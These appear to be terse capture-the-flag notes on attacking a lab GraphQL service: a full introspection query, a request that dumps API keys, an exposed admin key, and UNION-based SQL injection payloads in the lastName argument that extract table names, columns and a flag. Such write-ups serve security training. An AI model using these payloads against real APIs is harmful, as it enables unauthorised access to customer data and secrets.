Introspection query at /graphql
```
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```
- paste response into graph voyager online tool

```
POST /graphql HTTP/1.1
Host: 83.136.249.164:55060
Content-Length: 63
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://83.136.249.164:55060
Referer: http://83.136.249.164:55060/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"query":"{activeApiKeys { id role key }}"
}
```
- admin: 0711a879ed751e63330a78a4b195bbad
```
{"query":"{allCustomers(apiKey: \"0711a879ed751e63330a78a4b195bbad\") { id firstName lastName address }}"
}
```
```
{"query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\",lastName: \"Blair\" ){ id firstName lastName address }}"
}
```
```
{"query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\",lastName: \"Blair'\" ){ id firstName lastName address }}"
}
```
- Returns SQL error
- based on introspection query, CustomerObject has 4 columns and lastName is in the third one

```
{"query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=database()-- -\" ){ id firstName lastName address }}"
}
```
```
{"query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='flag'-- -\" ){ id firstName lastName address }}"
}
```
```
{"query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION select 1,2,GROUP_CONCAT(flag),4 from db.flag-- -\" ){ id firstName lastName address }}"
}
```
